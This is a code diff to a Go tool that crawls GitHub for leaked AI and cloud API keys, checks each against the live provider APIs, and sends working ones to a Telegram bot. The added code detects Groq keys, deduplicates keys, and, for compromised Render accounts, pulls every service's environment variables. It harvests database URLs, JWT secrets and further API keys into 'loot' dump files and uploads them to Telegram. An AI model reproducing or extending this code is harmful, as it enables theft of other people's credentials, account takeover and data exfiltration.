@@ -43,10 +43,10 @@ var (
 	ModalTokenSecretRegex = regexp.MustCompile(`\bas-[a-zA-Z0-9_-]{20,32}\b`)
 	ClaudeKeyRegex        = regexp.MustCompile(`\bsk-ant-api03-[A-Za-z0-9_-]{80,120}\b`)
 	GeminiKeyRegex        = regexp.MustCompile(`\b(AQ\.[A-Za-z0-9_-]{40,65}|AIzaSy[A-Za-z0-9_-]{33})\b`)
+	GroqKeyRegex          = regexp.MustCompile(`\bgsk_[A-Za-z0-9_-]{48,64}\b`)
 	GitHubTokenRegex      = regexp.MustCompile(`\b(ghp_|github_pat_|gho_|ghu_)[A-Za-z0-9_]{20,120}\b`)
 	Base64Candidate       = regexp.MustCompile(`[A-Za-z0-9+/=]{40,250}`)
-)
-// ============================================================================
+)// ============================================================================
 // IN-MEMORY VOLATILE TOKEN POOL (ZERO DISK TRACE)
 // ============================================================================
 type TokenPool struct {
@@ -435,9 +435,9 @@ Files Scanned: %d
 Commits Analyzed: %d
 
 <b>Live Discoveries:</b>
-- OpenAI (GPT-6): %d
-- Claude (Sonnet 5.5): %d
-- Gemini (Argon/Gemma): %d
+- OpenAI (gpt-4o / gpt-4o-mini): %d
+- Claude (claude-3-5-sonnet / haiku): %d
+- Gemini (1.5-flash / 1.5-pro / 2.0-flash): %d
 - OpenRouter (Positive Balance): %d
 - Render Accounts: %d`,
 			atomic.LoadUint64(&GlobalStats.FilesScanned),
@@ -689,10 +689,10 @@ func getScanningState() string {
 // VERIFICATION ENGINES (STRICT MODELS & BALANCES)
 // ============================================================================
 type Auditor struct {
-	client *http.Client
-	bot    *TelegramBot
+	client   *http.Client
+	bot      *TelegramBot
+	seenKeys sync.Map
 }
-
 func NewAuditor(bot *TelegramBot) *Auditor {
 	return &Auditor{
 		client: &http.Client{Timeout: 15 * time.Second},
@@ -732,6 +732,13 @@ func (a *Auditor) ScanText(text, source string) {
 			a.AuditGemini(keyCopy, source)
 		}()
 	}
+	for _, k := range GroqKeyRegex.FindAllString(text, -1) {
+		keyCopy := k
+		go func() {
+			defer func() { _ = recover() }()
+			a.AuditGroq(keyCopy, source)
+		}()
+	}
 	for _, k := range OpenRouterKeyRegex.FindAllString(text, -1) {
 		keyCopy := k
 		go func() {
@@ -757,8 +764,11 @@ func (a *Auditor) ScanText(text, source string) {
 	}
 }
 
-// 1. OpenAI: Live gpt-4o-mini & models verification
+// 1. OpenAI: Live gpt-4o-mini & models verification (Deduplicated)
 func (a *Auditor) AuditOpenAI(key, source string) {
+	if _, exists := a.seenKeys.LoadOrStore(key, true); exists {
+		return
+	}
 	url := "https://api.openai.com/v1/chat/completions"
 	payload, _ := json.Marshal(map[string]interface{}{
 		"model":      "gpt-4o-mini",
@@ -812,8 +822,11 @@ func (a *Auditor) AuditOpenAI(key, source string) {
 	}
 }
 
-// 2. Claude: claude-3-5-sonnet & haiku
+// 2. Claude: claude-3-5-sonnet & haiku (Deduplicated)
 func (a *Auditor) AuditClaude(key, source string) {
+	if _, exists := a.seenKeys.LoadOrStore(key, true); exists {
+		return
+	}
 	testClaudeModel := func(model string) bool {
 		url := "https://api.anthropic.com/v1/messages"
 		payload, _ := json.Marshal(map[string]interface{}{
@@ -855,8 +868,11 @@ func (a *Auditor) AuditClaude(key, source string) {
 	}
 }
 
-// 3. Gemini: gemini-1.5-flash / pro / 2.0-flash
+// 3. Gemini: gemini-1.5-flash / pro / 2.0-flash (Deduplicated)
 func (a *Auditor) AuditGemini(key, source string) {
+	if _, exists := a.seenKeys.LoadOrStore(key, true); exists {
+		return
+	}
 	testModel := func(model string) bool {
 		u := fmt.Sprintf("https://generativelanguage.googleapis.com/v1beta/models/%s:generateContent?key=%s", model, key)
 		pl, _ := json.Marshal(map[string]interface{}{
@@ -893,8 +909,36 @@ func (a *Auditor) AuditGemini(key, source string) {
 	}
 }
 
-// 4. OpenRouter: Positive Balance Filter
+// Groq AI Auditor (Deduplicated)
+func (a *Auditor) AuditGroq(key, source string) {
+	if _, exists := a.seenKeys.LoadOrStore(key, true); exists {
+		return
+	}
+	req, _ := http.NewRequest("GET", "https://api.groq.com/openai/v1/models", nil)
+	req.Header.Set("Authorization", "Bearer "+key)
+	resp, err := a.client.Do(req)
+	if err != nil || resp == nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == 200 {
+		alert := fmt.Sprintf(`🎯 <b>[LIVE GROQ AI KEY CAPTURED!]</b>
+━━━━━━━━━━━━━━━━━━
+🔑 Platform: Groq (Ultra-Low Latency)
+📁 Source: <code>%s</code>
+━━━━━━━━━━━━━━━━━━
+<code>%s</code>`, source, key)
+		a.bot.SendMessage(alert)
+		fmt.Printf("[🎉 LIVE GROQ KEY] Verified! Source: %s\n", source)
+	}
+}
+
+// 4. OpenRouter: Positive Balance Filter (Deduplicated)
 func (a *Auditor) AuditOpenRouter(key, source string) {
+	if _, exists := a.seenKeys.LoadOrStore(key, true); exists {
+		return
+	}
 	req, _ := http.NewRequest("GET", "https://openrouter.ai/api/v1/auth/key", nil)
 	req.Header.Set("Authorization", "Bearer "+key)
 	resp, err := a.client.Do(req)
@@ -944,8 +988,12 @@ func (a *Auditor) AuditOpenRouter(key, source string) {
 	}
 }
 
-// 5. Render: Live Accounts & Auto-Dump Dispatcher
+// 5. Render: Live Accounts, Recursive Env-Vars Secret Extractor & Rich Telegram Dispatcher
 func (a *Auditor) AuditRender(key, source string) {
+	if _, exists := a.seenKeys.LoadOrStore(key, true); exists {
+		return
+	}
+
 	req, _ := http.NewRequest("GET", "https://api.render.com/v1/owners", nil)
 	req.Header.Set("Authorization", "Bearer "+key)
 	resp, err := a.client.Do(req)
@@ -972,39 +1020,138 @@ func (a *Auditor) AuditRender(key, source string) {
 			// Fetch running services
 			sReq, _ := http.NewRequest("GET", "https://api.render.com/v1/services?limit=100", nil)
 			sReq.Header.Set("Authorization", "Bearer "+key)
-			sResp, err := a.client.Do(sReq)
-			var servicesData interface{}
-			if err == nil && sResp != nil {
-				defer sResp.Body.Close()
-				sBytes, _ := io.ReadAll(sResp.Body)
-				_ = json.Unmarshal(sBytes, &servicesData)
+			sResp, sErr := a.client.Do(sReq)
+
+			var rawServices []struct {
+				Service struct {
+					ID   string `json:"id"`
+					Name string `json:"name"`
+					Type string `json:"type"`
+					Repo string `json:"repo"`
+				} `json:"service"`
 			}
 
-			// 1. Build and save dump JSON
+			type ServiceDetail struct {
+				ID           string            `json:"id"`
+				Name         string            `json:"name"`
+				Type         string            `json:"type"`
+				Repo         string            `json:"repo"`
+				EnvVarsCount int               `json:"env_vars_count"`
+				EnvVars      map[string]string `json:"env_vars"`
+			}
+
+			var detailedServices []ServiceDetail
+			totalVars := 0
+			treasures := make(map[string]int)
+
+			if sErr == nil && sResp != nil {
+				sBytes, _ := io.ReadAll(sResp.Body)
+				sResp.Body.Close()
+				if json.Unmarshal(sBytes, &rawServices) == nil {
+					for _, item := range rawServices {
+						s := item.Service
+						sd := ServiceDetail{
+							ID:      s.ID,
+							Name:    s.Name,
+							Type:    s.Type,
+							Repo:    s.Repo,
+							EnvVars: make(map[string]string),
+						}
+
+						// Deep recursive fetch for env-vars
+						vURL := fmt.Sprintf("https://api.render.com/v1/services/%s/env-vars", s.ID)
+						vReq, _ := http.NewRequest("GET", vURL, nil)
+						vReq.Header.Set("Authorization", "Bearer "+key)
+						vResp, vErr := a.client.Do(vReq)
+						if vErr == nil && vResp != nil {
+							if vResp.StatusCode == 200 {
+								var varItems []struct {
+									EnvVar struct {
+										Key   string `json:"key"`
+										Value string `json:"value"`
+									} `json:"envVar"`
+								}
+								vBytes, _ := io.ReadAll(vResp.Body)
+								if json.Unmarshal(vBytes, &varItems) == nil {
+									for _, vi := range varItems {
+										vk := vi.EnvVar.Key
+										vv := vi.EnvVar.Value
+										if vk != "" {
+											sd.EnvVars[vk] = vv
+											totalVars++
+
+											// Extract and audit embedded secrets immediately
+											lk := strings.ToLower(vk)
+											lv := strings.ToLower(vv)
+											if strings.HasPrefix(vv, "sk-proj-") || strings.HasPrefix(vv, "sk-") {
+												treasures["OpenAI Key"]++
+												go a.AuditOpenAI(vv, fmt.Sprintf("%s (%s::%s)", owner, s.Name, vk))
+											} else if strings.HasPrefix(vv, "AIzaSy") {
+												treasures["Gemini Key"]++
+												go a.AuditGemini(vv, fmt.Sprintf("%s (%s::%s)", owner, s.Name, vk))
+											} else if strings.HasPrefix(vv, "sk-ant-") {
+												treasures["Claude Key"]++
+												go a.AuditClaude(vv, fmt.Sprintf("%s (%s::%s)", owner, s.Name, vk))
+											} else if strings.HasPrefix(vv, "gsk_") {
+												treasures["Groq Key"]++
+												go a.AuditGroq(vv, fmt.Sprintf("%s (%s::%s)", owner, s.Name, vk))
+											} else if strings.HasPrefix(lv, "mongodb+srv://") || strings.HasPrefix(lv, "postgres://") || strings.HasPrefix(lv, "redis://") || strings.HasPrefix(lv, "mysql://") {
+												treasures["Database Connection"]++
+											} else if strings.Contains(lk, "jwt") {
+												treasures["JWT Secret"]++
+											}
+										}
+									}
+								}
+							}
+							vResp.Body.Close()
+						}
+						sd.EnvVarsCount = len(sd.EnvVars)
+						detailedServices = append(detailedServices, sd)
+					}
+				}
+			}
+
+			// 1. Build and save full deep dump JSON
 			dumpObj := map[string]interface{}{
-				"key":       key,
-				"owner":     owner,
-				"live":      true,
-				"timestamp": time.Now().UTC().Format(time.RFC3339),
-				"services":  servicesData,
-				"source":    source,
+				"key":            key,
+				"owner":          owner,
+				"live":           true,
+				"timestamp":      time.Now().UTC().Format(time.RFC3339),
+				"services_count": len(detailedServices),
+				"total_env_vars": totalVars,
+				"services":       detailedServices,
+				"source":         source,
 			}
 			dumpFile := filepath.Join(LootDir, fmt.Sprintf("loot_dump-%d.json", time.Now().UnixNano()))
 			dumpBytes, _ := json.MarshalIndent(dumpObj, "", "  ")
 			_ = os.WriteFile(dumpFile, dumpBytes, 0644)
 
-			// 2. Instant Telegram Alert
-			alert := fmt.Sprintf(`🎯 <b>[LIVE RENDER KEY CAPTURED!]</b>
+			// 2. Format Treasure Highlights for Telegram
+			var hlLines []string
+			for tName, tCount := range treasures {
+				hlLines = append(hlLines, fmt.Sprintf("• <b>%s</b>: %d", tName, tCount))
+			}
+			hlText := "<i>No third-party secrets detected</i>"
+			if len(hlLines) > 0 {
+				hlText = strings.Join(hlLines, "\n")
+			}
+
+			alert := fmt.Sprintf(`🎯 <b>[LIVE RENDER ACCOUNT CAPTURED!]</b>
 ━━━━━━━━━━━━━━━━━━
 👤 Owner: <b>%s</b>
+📦 Services: %d | 🔐 Secrets: %d
 📁 Source: <code>%s</code>
 ━━━━━━━━━━━━━━━━━━
-<code>%s</code>`, owner, source, key)
+💎 <b>Discovered Highlights:</b>
+%s
+━━━━━━━━━━━━━━━━━━
+<code>%s</code>`, owner, len(detailedServices), totalVars, source, hlText, key)
 			a.bot.SendMessage(alert)
 
 			// 3. Instant Document Upload to Telegram!
-			a.bot.SendDocument(dumpFile, fmt.Sprintf("📄 Full Audit Dump: %s (%s)", owner, filepath.Base(dumpFile)))
-			fmt.Printf("[🎉 LIVE RENDER ACCOUNT] %s -> Dump Dispatched to Telegram!\n", owner)
+			a.bot.SendDocument(dumpFile, fmt.Sprintf("📄 Full Secrets Dump: %s (%s)", owner, filepath.Base(dumpFile)))
+			fmt.Printf("[🎉 LIVE RENDER ACCOUNT] %s -> Deep Dump Dispatched to Telegram! (Secrets: %d)\n", owner, totalVars)
 		}
 	}
 }
@@ -1106,11 +1253,12 @@ func main() {
 Specs: 1 CPU, 2GB RAM Mode
 Volatile Memory: <b>Active (Zero Keys Stored on Disk)</b>
 Target Verification:
-- OpenAI (gpt-6.1-terra / gpt-6.2-astra)
-- Claude (claude-sonnet-5-5)
-- Gemini (gemini-4-argon / gemma-4-31b-it)
+- OpenAI (gpt-4o / gpt-4o-mini)
+- Claude (claude-3-5-sonnet / claude-3-haiku)
+- Gemini (1.5-flash / 1.5-pro / 2.0-flash)
+- Groq (Ultra-Low Latency AI)
 - OpenRouter (Positive Balance Filter)
-- Render (Live Accounts + Auto-Dump Upload)
+- Render (Deep Env-Vars Recursive Dump)
 
 <i>Awaiting GitHub tokens... Send them here to activate crawlers!</i>`)
 
@@ -1122,6 +1270,17 @@ Target Verification:
 
 	fileQueue := make(chan FileTask, MaxQueueSize)
 	repoQueue := make(chan string, 500)
+
+	// Auto-Rehydration: Load seed GitHub tokens from environment on startup
+	seedTokens := os.Getenv("SEED_GITHUB_TOKENS")
+	if seedTokens != "" {
+		cands := extractCandidateTokens(seedTokens)
+		if len(cands) > 0 {
+			added := tokenPool.AddTokens(cands)
+			fmt.Printf("[+] Auto-Rehydration: Ingested %d backup token(s) from SEED_GITHUB_TOKENS into RAM.\n", added)
+			telegramBot.SendMessage(fmt.Sprintf("⚡ <b>Auto-Rehydration:</b> Loaded %d GitHub tokens into RAM after restart.", added))
+		}
+	}
 
 	// Workers (15 Parallel File Extractors with leak-safe HTTP)
 	for i := 1; i <= 15; i++ {
